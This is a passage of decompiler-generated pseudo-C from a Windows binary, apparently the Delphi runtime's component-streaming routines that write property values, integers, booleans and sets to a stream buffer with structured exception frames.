    return sub_41AAC0(*(_DWORD *)(a1 + 4), a2, a2 >> 31);
  }
  return result;
}

//----- (0041DAE4) --------------------------------------------------------
int __usercall sub_41DAE4@<eax>(int a1@<eax>, int a2@<edx>)
{
  int result; // eax

  result = sub_41B348(a1, a2);
  *(_DWORD *)(a1 + 28) = a2;
  return result;
}

//----- (0041DAFC) --------------------------------------------------------
_DWORD *__usercall sub_41DAFC@<eax>(_DWORD *result@<eax>, char *a2@<edx>, unsigned int a3@<ecx>)
{
  _DWORD *v5; // edi
  unsigned int v6; // ecx
  bool v7; // cc
  unsigned int v8; // ecx
  char v9; // dl
  unsigned int v10; // ecx
  char *v11; // edi
  char *v12; // esi
  int v13; // ecx
  _DWORD *v14; // [esp-4h] [ebp-10h]

  v5 = result;
  while ( a3 )
  {
    v6 = v5[3];
    v7 = v6 <= v5[4];
    v8 = v6 - v5[4];
    if ( v7 )
    {
      sub_41DBD0((int)v5);
      v8 = v5[3];
    }
    if ( v8 >= a3 )
      v8 = a3;
    a3 -= v8;
    v14 = v5;
    result = (_DWORD *)(v5[4] + v5[2]);
    v5[4] += v8;
    v9 = v8;
    v10 = v8 >> 2;
    qmemcpy(result, a2, 4 * v10);
    v12 = &a2[4 * v10];
    v11 = (char *)&result[v10];
    v13 = v9 & 3;
    qmemcpy(v11, v12, v13);
    a2 = &v12[v13];
    v5 = v14;
  }
  return result;
}

//----- (0041DB48) --------------------------------------------------------
_DWORD *__userpurge sub_41DB48@<eax>(
        _DWORD *a1@<eax>,
        void (__stdcall *a2)(struct _EXCEPTION_REGISTRATION_RECORD *),
        int a3)
{
  int v4; // ecx
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-18h] BYREF
  void *v7; // [esp-8h] [ebp-14h]
  int *v8; // [esp-4h] [ebp-10h]
  void *v9; // [esp+0h] [ebp-Ch]
  unsigned int v10; // [esp+4h] [ebp-8h] BYREF
  _DWORD *v11; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v11 = sub_403504(&off_417DB0, 1);
  v8 = &savedregs;
  v7 = &loc_41DBC0;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  a2(ExceptionList);
  sub_41FAA4(a1, 10, v4);
  v10 = sub_41AAD4((int)v11);
  sub_41DAFC(a1, (char *)&v10, 4u);
  sub_41DAFC(a1, (char *)v11[1], v10);
  __writefsdword(0, (unsigned int)v7);
  v9 = &loc_41DBC7;
  return sub_403534(v11);
}
// 41DB7B: variable 'v4' is possibly undefined
// 417DB0: using guessed type int (*off_417DB0)();

//----- (0041DBD0) --------------------------------------------------------
int __usercall sub_41DBD0@<eax>(int a1@<eax>)
{
  int result; // eax

  sub_41AD04(*(_DWORD *)(a1 + 16), *(_DWORD *)(a1 + 8));
  result = 0;
  *(_DWORD *)(a1 + 16) = 0;
  return result;
}
// 41AD04: using guessed type int __fastcall sub_41AD04(_DWORD, _DWORD);

//----- (0041DBE8) --------------------------------------------------------
_DWORD *__usercall sub_41DBE8@<eax>(_DWORD *a1@<eax>)
{
  unsigned int v3[2]; // [esp-14h] [ebp-18h] BYREF
  int *v4; // [esp-Ch] [ebp-10h]
  char *v5; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v5 = 0;
  v4 = &savedregs;
  v3[1] = (unsigned int)&loc_41DC2B;
  v3[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v3);
  sub_40444C(&v5);
  sub_41F99C(a1, v5);
  __writefsdword(0, v3[0]);
  v4 = (int *)&loc_41DC32;
  return sub_40426C(&v5);
}

//----- (0041DC38) --------------------------------------------------------
_DWORD *__usercall sub_41DC38@<eax>(_DWORD *a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  int v4; // ecx
  int v5; // eax
  int v6; // ebx
  int v7; // esi
  int v8; // ecx
  _DWORD *result; // eax
  unsigned int v10[6]; // [esp-Ch] [ebp-20h] BYREF
  int v11; // [esp+Ch] [ebp-8h]
  _DWORD *v12; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v12 = a1;
  v11 = a1[8];
  a1[8] = 0;
  v10[2] = (unsigned int)&savedregs;
  v10[1] = (unsigned int)&loc_41DCCA;
  v10[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v10);
  sub_41FAA4(v12, 14, a3);
  if ( a2 )
  {
    v5 = sub_419520(a2);
    if ( v5 - 1 >= 0 )
    {
      v6 = v5;
      v7 = 0;
      do
      {
        sub_41E44C(v12, v4);
        sub_419528(a2, v7);
        sub_41E4A0();
        sub_41E454(v12, v8);
        ++v7;
        --v6;
      }
      while ( v6 );
    }
  }
  sub_41E454(v12, v4);
  __writefsdword(0, v10[0]);
  result = v12;
  v12[8] = v11;
  return result;
}
// 41DC87: variable 'v4' is possibly undefined
// 41DCA2: variable 'v8' is possibly undefined
// 41E4A0: using guessed type int sub_41E4A0(void);

//----- (0041DCD8) --------------------------------------------------------
int __usercall sub_41DCD8@<eax>(_BYTE *a1@<eax>, int a2)
{
  int v2; // eax
  int v3; // ebx
  int i; // edi
  int v5; // esi

  v2 = *(_DWORD *)(*(_DWORD *)(a2 - 4) + 48);
  if ( *(_DWORD *)(v2 + 8) - 1 < 0 )
    return 0;
  v3 = *(_DWORD *)(v2 + 8);
  for ( i = 0; ; ++i )
  {
    v5 = sub_418C80(*(_DWORD *)(*(_DWORD *)(a2 - 4) + 48), i);
    if ( sub_407ACC(*(_BYTE **)(v5 + 8), a1) )
      break;
    if ( !--v3 )
      return 0;
  }
  return v5;
}

//----- (0041DD28) --------------------------------------------------------
int __usercall sub_41DD28@<eax>(int a1@<eax>, int a2@<edx>)
{
  int v3; // eax
  int result; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-24h] BYREF
  void *v6; // [esp-8h] [ebp-20h]
  int *v7; // [esp-4h] [ebp-1Ch]
  int v8; // [esp+8h] [ebp-10h] BYREF
  int v9; // [esp+Ch] [ebp-Ch]
  int v10; // [esp+10h] [ebp-8h]
  int v11; // [esp+14h] [ebp-4h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v11 = a1;
  v10 = *(_DWORD *)(a1 + 32);
  v9 = *(_DWORD *)(a1 + 40);
  v7 = &savedregs;
  v6 = &loc_41DDF6;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  *(_WORD *)(a2 + 28) |= 4u;
  if ( *(_DWORD *)(v11 + 48) )
  {
    v3 = sub_41DCD8(*(_BYTE **)(a2 + 8), (int)&savedregs);
    *(_DWORD *)(v11 + 32) = v3;
  }
  if ( *(_WORD *)(v11 + 66) && (!*(_DWORD *)(v11 + 32) || sub_4036C0(*(int **)(v11 + 32), (int)off_418058)) )
  {
    v8 = *(_DWORD *)(v11 + 32);
    (*(void (__fastcall **)(int, int, int, int *, _DWORD))(v11 + 64))(a2, v11, v11 + 40, &v8, *(_DWORD *)(a2 + 8));
    *(_DWORD *)(v11 + 32) = v8;
  }
  (*(void (__stdcall **)(struct _EXCEPTION_REGISTRATION_RECORD *))(*(_DWORD *)a2 + 36))(ExceptionList);
  *(_WORD *)(a2 + 28) &= ~4u;
  __writefsdword(0, (unsigned int)v6);
  *(_DWORD *)(v11 + 32) = v10;
  result = v11;
  *(_DWORD *)(v11 + 40) = v9;
  return result;
}
// 418058: using guessed type int (*off_418058[7])();

//----- (0041DE04) --------------------------------------------------------
int __usercall sub_41DE04@<eax>(_DWORD *a1@<eax>, int *a2@<edx>)
{
  int v2; // ebx
  int v3; // eax
  int v4; // ebx
  int v5; // eax
  int v6; // eax
  int v7; // eax
  int v8; // eax
  int v9; // eax
  int v10; // ecx
  int v11; // ebx
  _DWORD *v12; // eax
  int v13; // ecx
  int v14; // eax
  _DWORD *v16; // [esp-34h] [ebp-174h]
  struct _EXCEPTION_REGISTRATION_RECORD *v17; // [esp-30h] [ebp-170h] BYREF
  void *v18; // [esp-2Ch] [ebp-16Ch]
  int *v19; // [esp-28h] [ebp-168h]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-24h] [ebp-164h] BYREF
  void *v21; // [esp-20h] [ebp-160h]
  int *v22; // [esp-1Ch] [ebp-15Ch]
  char *v23; // [esp-18h] [ebp-158h]
  int *v24; // [esp-14h] [ebp-154h]
  char *v25; // [esp-10h] [ebp-150h]
  _DWORD v26[5]; // [esp-Ch] [ebp-14Ch] BYREF
  char *v27; // [esp+8h] [ebp-138h] BYREF
  char *v28; // [esp+Ch] [ebp-134h] BYREF
  char *v29; // [esp+10h] [ebp-130h] BYREF
  char *v30; // [esp+14h] [ebp-12Ch] BYREF
  char v31[259]; // [esp+18h] [ebp-128h] BYREF
  char v32; // [esp+11Bh] [ebp-25h]
  int v33; // [esp+11Ch] [ebp-24h]
  int v34; // [esp+120h] [ebp-20h]
  int v35; // [esp+124h] [ebp-1Ch]
  int v36; // [esp+128h] [ebp-18h]
  int v37; // [esp+12Ch] [ebp-14h]
  int v38; // [esp+130h] [ebp-10h]
  int v39; // [esp+134h] [ebp-Ch]
  int *v40; // [esp+138h] [ebp-8h]
  _DWORD *v41; // [esp+13Ch] [ebp-4h]
  int savedregs; // [esp+140h] [ebp+0h] BYREF

  v27 = 0;
  v30 = 0;
  v29 = 0;
  v28 = 0;
  v40 = a2;
  v41 = a1;
  v26[2] = &savedregs;
  v26[1] = &loc_41E1E0;
  v26[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v26);
  sub_403484(*a2, v31);
  v2 = (unsigned __int8)v31[0];
  v3 = sub_404524(v40[2]);
  if ( v3 + v2 + 9 > v41[3] - v41[4] )
    sub_41DBD0((int)v41);
  v39 = sub_41DA90((int)v41);
  v32 = 0;
  if ( (*((_BYTE *)v40 + 29) & 2) != 0 )
  {
    if ( v41[8] && (v40[7] & 0x20) != 0 && v41[12] )
      v32 |= 1u;
    else
      v32 |= 4u;
  }
  else if ( v41[8] )
  {
    v32 |= 1u;
  }
  v4 = v41[12];
  if ( v4 )
  {
    if ( v41[13] < *(_DWORD *)(v4 + 8) )
    {
      if ( !v41[8] || (v5 = sub_418C80(v41[12], v41[13]), v5 != v41[8]) )
        v32 |= 2u;
    }
  }
  sub_41E45C(v41, v32, v41[14]);
  if ( *((_BYTE *)v41 + 72) )
  {
    v6 = sub_40347C((int)v40);
    v7 = sub_403740(v6);
    v8 = sub_4163BC(v7);
    sub_4044C8(&v29, (char *)(v8 + 10));
    v25 = v29;
    v24 = &dword_41E1FC;
    sub_403484(*v40, v31);
    sub_4044C8(&v28, v31);
    v23 = v28;
    sub_4045E4((volatile __int32 *)&v30, 3);
    sub_41F8BC(v41, v30);
  }
  else
  {
    sub_403484(*v40, v31);
    sub_4044C8(&v27, v31);
    sub_41F8BC(v41, v27);
  }
  sub_41F8BC(v41, (char *)v40[2]);
  v38 = sub_41DA90((int)v41);
  v9 = v41[12];
  if ( v9 && v41[13] < *(_DWORD *)(v9 + 8) )
  {
    if ( v41[8] )
      ++v41[13];
    ++v41[14];
  }
  sub_41E4A0((int)v41, v40);
  sub_41E454(v41, v10);
  v37 = v41[12];
  v36 = v41[13];
  v35 = v41[14];
  v34 = v41[6];
  v33 = v41[10];
  v22 = &savedregs;
  v21 = &loc_41E181;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  v41[12] = 0;
  v41[13] = 0;
  v41[14] = 0;
  if ( !*((_BYTE *)v41 + 36) )
  {
    v19 = &savedregs;
    v18 = &loc_41E13F;
    v17 = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&v17);
    if ( v41[8] && sub_4036C0((int *)v41[8], (int)off_418058) )
    {
      v11 = v41[8];
      if ( sub_4036C0((int *)v11, (int)off_418058) && (*(_BYTE *)(v11 + 29) & 2) != 0 )
        v41[10] = v11;
      v12 = sub_403504(off_417624, 1);
      v41[12] = v12;
      v16 = v41;
      sub_403714((int *)v41[8], -3);
    }
    if ( (*((_BYTE *)v40 + 29) & 2) != 0 )
      v41[6] = v40;
    sub_403714(v40, -3);
    __writefsdword(0, (unsigned int)sub_41DD28);
    sub_403534((_DWORD *)v41[12]);
  }
  v13 = (int)v18;
  __writefsdword(0, (unsigned int)v16);
  v18 = &loc_41E188;
  v41[12] = v37;
  v41[13] = v36;
  v41[14] = v35;
  v41[6] = v34;
  v41[10] = v33;
  sub_41E454(v41, v13);
  if ( (int *)v41[6] != v40 && v32 == 1 )
  {
    v14 = sub_41DA90((int)v41);
    if ( v14 == v38 + 2 )
      sub_41DAA8((int)v41, v39);
  }
  __writefsdword(0, (unsigned int)v19);
  v21 = &loc_41E1E7;
  return sub_404290((int)&v27, 4);
}
// 41E018: variable 'v10' is possibly undefined
// 41E14B: variable 'v16' is possibly undefined
// 417624: using guessed type int (*off_417624[4])();
// 418058: using guessed type int (*off_418058[7])();
// 41E1FC: using guessed type int dword_41E1FC;

//----- (0041E204) --------------------------------------------------------
int __usercall sub_41E204@<eax>(_DWORD *a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  a1[10] = a3;
  a1[8] = a3;
  a1[6] = a2;
  a1[7] = a2;
  sub_41F8AC(a1);
  return sub_41DD28((int)a1, a2);
}

//----- (0041E22C) --------------------------------------------------------
_DWORD *__userpurge sub_41E22C@<eax>(_DWORD *a1@<eax>, int a2@<ecx>, char a3, int a4, int a5)
{
  sub_41FAA4(a1, 5, a2);
  return sub_41DAFC(a1, &a3, 0xAu);
}

//----- (0041E250) --------------------------------------------------------
_DWORD *__userpurge sub_41E250@<eax>(_DWORD *a1@<eax>, int a2@<ecx>, char a3)
{
  sub_41FAA4(a1, 15, a2);
  return sub_41DAFC(a1, &a3, 4u);
}

//----- (0041E274) --------------------------------------------------------
_DWORD *__userpurge sub_41E274@<eax>(_DWORD *a1@<eax>, int a2@<ecx>, char a3, int a4)
{
  sub_41FAA4(a1, 16, a2);
  return sub_41DAFC(a1, &a3, 8u);
}

//----- (0041E298) --------------------------------------------------------
_DWORD *__userpurge sub_41E298@<eax>(_DWORD *a1@<eax>, int a2@<ecx>, char a3, int a4)
{
  sub_41FAA4(a1, 17, a2);
  return sub_41DAFC(a1, &a3, 8u);
}

//----- (0041E2BC) --------------------------------------------------------
_DWORD *__usercall sub_41E2BC@<eax>(_DWORD *a1@<eax>, char *a2@<edx>)
{
  int v4; // ecx
  int v6; // ecx
  int v7; // ecx
  int v8; // ecx

  if ( sub_407ACC(a2, "False") )
    return sub_41FAA4(a1, 8, v4);
  if ( sub_407ACC(a2, "True") )
    return sub_41FAA4(a1, 9, v6);
  if ( sub_407ACC(a2, "Null") )
    return sub_41FAA4(a1, 0, v7);
  if ( sub_407ACC(a2, &dword_41E37C) )
    return sub_41FAA4(a1, 13, v8);
  sub_41FAA4(a1, 7, v8);
  return sub_41F8BC(a1, a2);
}
// 41E2D6: variable 'v4' is possibly undefined
// 41E2F2: variable 'v6' is possibly undefined
// 41E30D: variable 'v7' is possibly undefined
// 41E328: variable 'v8' is possibly undefined
// 41E37C: using guessed type int dword_41E37C;

//----- (0041E380) --------------------------------------------------------
_DWORD *__usercall sub_41E380@<eax>(_DWORD *a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  int v5[2]; // [esp+0h] [ebp-8h] BYREF

  v5[0] = a2;
  if ( a2 < -128 || v5[0] > 127 )
  {
    if ( v5[0] < -32768 || v5[0] > 0x7FFF )
    {
      sub_41FAA4(a1, 4, a3);
      return sub_41DAFC(a1, (char *)v5, 4u);
    }
    else
    {
      sub_41FAA4(a1, 3, a3);
      return sub_41DAFC(a1, (char *)v5, 2u);
    }
  }
  else
  {
    sub_41FAA4(a1, 2, a3);
    return sub_41DAFC(a1, (char *)v5, 1u);
  }
}

//----- (0041E3F4) --------------------------------------------------------
_DWORD *__userpurge sub_41E3F4@<eax>(_DWORD *a1@<eax>, int a2@<ecx>, __int64 a3)
{
  if ( a3 >= (__int64)0xFFFFFFFF80000000ui64 && a3 <= 0x7FFFFFFF )
    return sub_41E380(a1, a3, a2);
  sub_41FAA4(a1, 19, a2);
  return sub_41DAFC(a1, (char *)&a3, 8u);
}

//----- (0041E44C) --------------------------------------------------------
_DWORD *__usercall sub_41E44C@<eax>(_DWORD *a1@<eax>, int a2@<ecx>)
{
  return sub_41FAA4(a1, 1, a2);
}

//----- (0041E454) --------------------------------------------------------
_DWORD *__usercall sub_41E454@<eax>(_DWORD *a1@<eax>, int a2@<ecx>)
{
  return sub_41FAA4(a1, 0, a2);
}

//----- (0041E45C) --------------------------------------------------------
_DWORD *__usercall sub_41E45C@<eax>(_DWORD *result@<eax>, char a2@<dl>, int a3@<ecx>)
{
  _DWORD *v4; // ebx
  int v5; // ecx
  int v6; // [esp+0h] [ebp-Ch] BYREF

  v6 = a3;
  LOBYTE(v6) = a2;
  v4 = result;
  LOBYTE(result) = 0;
  if ( a2 )
  {
    BYTE1(v6) = a2 | 0xF0;
    result = sub_41DAFC(v4, (char *)&v6 + 1, 1u);
    if ( (v6 & 2) != 0 )
      return sub_41E380(v4, a3, v5);
  }
  return result;
}
// 41E493: variable 'v5' is possibly undefined

//----- (0041E4A0) --------------------------------------------------------
int __usercall sub_41E4A0@<eax>(int a1@<eax>, int *a2@<edx>)
{
  int v2; // eax
  int v3; // eax
  int v4; // esi
  int v5; // edi
  _DWORD **v6; // ebx
  unsigned int v8[2]; // [esp-Ch] [ebp-28h] BYREF
  int *v9; // [esp-4h] [ebp-20h]
  void *v10; // [esp+Ch] [ebp-10h]
  int v11; // [esp+10h] [ebp-Ch]
  int *v12; // [esp+14h] [ebp-8h]
  int v13; // [esp+18h] [ebp-4h]
  int savedregs; // [esp+1Ch] [ebp+0h] BYREF

  v12 = a2;
  v13 = a1;
  v2 = sub_403740(*a2);
  v11 = *(__int16 *)(sub_4163BC(v2) + 8);
  if ( v11 > 0 )
  {
    v10 = (void *)sub_4026E0(4 * v11);
    v9 = &savedregs;
    v8[1] = (unsigned int)&loc_41E54D;
    v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v8);
    v3 = sub_403740(*v12);
    sub_4165DC(v3, v10);
    if ( v11 - 1 >= 0 )
    {
      v4 = v11;
      v5 = 0;
      do
      {
        v6 = (_DWORD **)*((_DWORD *)v10 + v5);
        if ( !v6 )
          break;
        if ( sub_416630(v12, *((_DWORD *)v10 + v5)) )
          sub_41F348(v12, v6, (int)v6, v5, v4);
        ++v5;
        --v4;
      }
      while ( v4 );
    }
    __writefsdword(0, v8[0]);
    v9 = (int *)&loc_41E554;
    sub_402700((int)v10);
  }
  return (*(int (**)(void))(*v12 + 4))();
}

//----- (0041E568) --------------------------------------------------------
bool __cdecl sub_41E568(int a1)
{
  int v1; // eax
  bool result; // al

  result = 0;
  if ( *(_DWORD *)(*(_DWORD *)(a1 - 4) + 32) )
  {
    if ( *(_DWORD *)(*(_DWORD *)(a1 - 4) + 40) )
    {
      v1 = sub_40347C(*(_DWORD *)(*(_DWORD *)(a1 - 4) + 40));
      if ( sub_40372C(**(_DWORD **)(*(_DWORD *)(a1 - 4) + 24), v1) )
        return 1;
    }
  }
  return result;
}

//----- (0041E5B0) --------------------------------------------------------
_DWORD *__cdecl sub_41E5B0(int a1)
{
  unsigned int v2[2]; // [esp-Ch] [ebp-10h] BYREF
  int *v3; // [esp-4h] [ebp-8h]
  char *v4; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v4 = 0;
  v3 = &savedregs;
  v2[1] = (unsigned int)&loc_41E5F8;
  v2[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v2);
  sub_4044C8(&v4, (char *)(*(_DWORD *)(a1 - 8) + 26));
  sub_41F858(*(_DWORD *)(a1 - 4), v4);
  __writefsdword(0, v2[0]);
  v3 = (int *)&loc_41E5FF;
  return sub_40426C(&v4);
}

//----- (0041E604) --------------------------------------------------------
_DWORD *__usercall sub_41E604@<eax>(int a1@<eax>, int a2)
{
  int *v3; // edi
  int v4; // ecx
  unsigned int i; // ebx
  bool v6; // cf
  unsigned int v8[2]; // [esp-18h] [ebp-1Ch] BYREF
  int *v9; // [esp-10h] [ebp-14h]
  char *v10; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v10 = 0;
  v9 = &savedregs;
  v8[1] = (unsigned int)&loc_41E68A;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  v3 = **(int ***)(sub_4163BC(*(_DWORD *)(a2 - 12)) + 1);
  sub_41FAA4(*(_DWORD **)(a2 - 4), 11, v4);
  for ( i = 0; i != 32; ++i )
  {
    v6 = i < 0x1F;
    if ( i <= 0x1F )
      v6 = _bittest(&a1, i);
    if ( v6 )
    {
      sub_4163C8(v3, i, &v10);
      sub_41F8BC(*(_DWORD **)(a2 - 4), v10);
    }
  }
  sub_41F8BC(*(_DWORD **)(a2 - 4), 0);
  __writefsdword(0, v8[0]);
  v9 = (int *)&loc_41E691;
  return sub_40426C(&v10);
}
// 41E634: variable 'v4' is possibly undefined

//----- (0041E698) --------------------------------------------------------
_DWORD *__usercall sub_41E698@<eax>(int a1@<eax>, int a2@<edx>, int a3)
{
  int v4; // ecx
  unsigned __int8 (*v5)(void); // ebx
  unsigned int v7[2]; // [esp-14h] [ebp-18h] BYREF
  int *v8; // [esp-Ch] [ebp-10h]
  char *v9; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v9 = 0;
  v8 = &savedregs;
  v7[1] = (unsigned int)&loc_41E6F8;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  v5 = (unsigned __int8 (*)(void))sub_4187D8(a1);
  if ( v5 && v5() )
    sub_41E2BC(*(_DWORD **)(a3 - 4), v9);
  else
    sub_41E380(*(_DWORD **)(a3 - 4), a2, v4);
  __writefsdword(0, v7[0]);
  v8 = (int *)&loc_41E6FF;
  return sub_40426C(&v9);
}
// 41E6DD: variable 'v4' is possibly undefined

//----- (0041E704) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
_DWORD *__usercall sub_41E704@<eax>(int a1@<eax>, int a2)
{
  int v3; // ecx
  unsigned int v5[2]; // [esp-1Ch] [ebp-20h] BYREF
  void **v6; // [esp-14h] [ebp-18h]
  _DWORD v7[4]; // [esp-10h] [ebp-14h] BYREF
  __int32 v8; // [esp+0h] [ebp-4h] BYREF
  void *savedregs; // [esp+4h] [ebp+0h] BYREF

  v8 = 0;
  v7[2] = &savedregs;
  v7[1] = &loc_41E79A;
  v7[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  sub_41E5B0(a2);
  sub_404304(&v8, *(_DWORD *)(*(_DWORD *)(a2 - 4) + 44));
  v6 = &savedregs;
  v5[1] = (unsigned int)&loc_41E77D;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  sub_40426C((_DWORD *)(*(_DWORD *)(a2 - 4) + 44));
  sub_41DC38(*(_DWORD **)(a2 - 4), a1, v3);
  __writefsdword(0, v5[0]);
  v6 = (void **)&loc_41E784;
  sub_4042C0((volatile __int32 *)(*(_DWORD *)(a2 - 4) + 44), v8);
  __writefsdword(0, v7[3]);
  savedregs = &loc_41E7A1;
  return sub_40426C(&v8);
}
// 41E794: bad sp value at call
// 41E759: variable 'v3' is possibly undefined

//----- (0041E7A8) --------------------------------------------------------
bool __cdecl sub_41E7A8(int a1)
{
  int v1; // eax
  int v3; // eax

  if ( sub_41E568(*(_DWORD *)(a1 + 8)) )
  {
    LOBYTE(v1) = sub_416660(
                   *(_DWORD **)(*(_DWORD *)(*(_DWORD *)(a1 + 8) - 4) + 32),
                   *(_DWORD *)(*(_DWORD *)(a1 + 8) - 8));
    return v1 == *(_DWORD *)(a1 - 4);
  }
  else
  {
    v3 = *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(a1 + 8) - 8) + 20);
    return v3 != 0x80000000 && v3 == *(_DWORD *)(a1 - 4);
  }
}
// 41E7DC: variable 'v1' is possibly undefined

//----- (0041E804) --------------------------------------------------------
_DWORD *__cdecl sub_41E804(int a1)
{
  int v1; // eax
  unsigned int v3[2]; // [esp-Ch] [ebp-14h] BYREF
  int *v4; // [esp-4h] [ebp-Ch]
  char *v5; // [esp+0h] [ebp-8h] BYREF
  int v6; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v5 = 0;
  v4 = &savedregs;
  v3[1] = (unsigned int)&loc_41E8CD;
  v3[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v3);
  LOBYTE(v1) = sub_416660(*(_DWORD **)(a1 - 16), *(_DWORD *)(a1 - 8));
  v6 = v1;
  if ( !sub_41E7A8((int)&savedregs) )
  {
    sub_41E5B0(a1);
    switch ( **(_BYTE **)(a1 - 12) )
    {
      case 1:
        sub_41E698(***(_DWORD ***)(a1 - 8), v6, a1);
        break;
      case 2:
        sub_41DBE8(*(_DWORD **)(a1 - 4));
        break;
      case 3:
        sub_4163C8(*(int **)(a1 - 12), v6, &v5);
        sub_41E2BC(*(_DWORD **)(a1 - 4), v5);
        break;
      case 6:
        sub_41E604(v6, a1);
        break;
    }
  }
  __writefsdword(0, v3[0]);
  v4 = (int *)&loc_41E8D4;
  return sub_40426C(&v5);
}
// 41E82E: variable 'v1' is possibly undefined

//----- (0041E8D8) --------------------------------------------------------
bool __cdecl sub_41E8D8(int a1)
{
  if ( sub_41E568(*(_DWORD *)(a1 + 8)) )
    return *(double *)(a1 - 16) == sub_416B90(
                                     (_DWORD *)*(_DWORD *)(*(_DWORD *)(*(_DWORD *)(a1 + 8) - 4) + 32),
                                     *(_DWORD *)(*(_DWORD *)(a1 + 8) - 8));
  else
    return *(double *)(a1 - 16) == 0.0;
}

//----- (0041E930) --------------------------------------------------------
unsigned __int8 __cdecl sub_41E930(int a1)
{
  unsigned __int8 result; // al
  _DWORD *v2; // eax
  int v3; // [esp-4h] [ebp-14h]
  double v4; // [esp+0h] [ebp-10h]
  __int16 v5; // [esp+8h] [ebp-8h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v4 = sub_416B90((_DWORD *)*(_DWORD *)(a1 - 16), *(_DWORD *)(a1 - 8));
  result = sub_41E8D8((int)&savedregs);
  if ( !result )
  {
    v2 = sub_41E5B0(a1);
    LOWORD(v2) = v5;
    return (unsigned __int8)sub_41E22C(*(_DWORD **)(a1 - 4), v3, SLOBYTE(v4), SHIDWORD(v4), (int)v2);
  }
  return result;
}
// 41E960: variable 'v5' is possibly undefined
// 41E971: variable 'v3' is possibly undefined

//----- (0041E97C) --------------------------------------------------------
bool __cdecl sub_41E97C(int a1)
{
  __int64 v1; // rax

  if ( !sub_41E568(*(_DWORD *)(a1 + 8)) )
    return *(_QWORD *)(a1 - 8) == 0i64;
  LODWORD(v1) = sub_416FAC(
                  *(_DWORD **)(*(_DWORD *)(*(_DWORD *)(a1 + 8) - 4) + 32),
                  *(_DWORD *)(*(_DWORD *)(a1 + 8) - 8));
  return v1 == *(_QWORD *)(a1 - 8);
}
// 41E9B5: variable 'v1' is possibly undefined

//----- (0041E9CC) --------------------------------------------------------
unsigned __int8 __cdecl sub_41E9CC(int a1)
{
  int v1; // edx
  unsigned __int8 result; // al
  int v3; // [esp-4h] [ebp-Ch]
  __int64 v4; // [esp+0h] [ebp-8h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  LODWORD(v4) = sub_416FAC(*(_DWORD **)(a1 - 16), *(_DWORD *)(a1 - 8));
  HIDWORD(v4) = v1;
  result = sub_41E97C((int)&savedregs);
  if ( !result )
  {
    sub_41E5B0(a1);
    return (unsigned __int8)sub_41E3F4(*(_DWORD **)(a1 - 4), v3, v4);
  }
  return result;
}
// 41E9E6: variable 'v1' is possibly undefined
// 41EA0A: variable 'v3' is possibly undefined

//----- (0041EA14) --------------------------------------------------------
int __usercall sub_41EA14@<eax>(int a1@<ebx>, int a2)
{
  char v2; // zf
  unsigned int v4[2]; // [esp-10h] [ebp-14h] BYREF
  int *v5; // [esp-8h] [ebp-Ch]
  OLECHAR *v6; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v6 = 0;
  v5 = &savedregs;
  v4[1] = (unsigned int)&loc_41EA8F;
  v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  if ( sub_41E568(*(_DWORD *)(a2 + 8)) )
  {
    sub_4169D4(
      *(_DWORD **)(*(_DWORD *)(*(_DWORD *)(a2 + 8) - 4) + 32),
      *(_DWORD *)(*(_DWORD *)(a2 + 8) - 8),
      (int *)&v6);
    sub_404AD8(*(_DWORD *)(a2 - 4), v6);
  }
  else
  {
    sub_404AD8(*(_DWORD *)(a2 - 4), 0);
  }
  LOBYTE(a1) = v2;
  __writefsdword(0, v4[0]);
  v5 = (int *)&loc_41EA96;
  sub_404900(&v6);
  return a1;
}
// 41EA64: variable 'v2' is possibly undefined

//----- (0041EA9C) --------------------------------------------------------
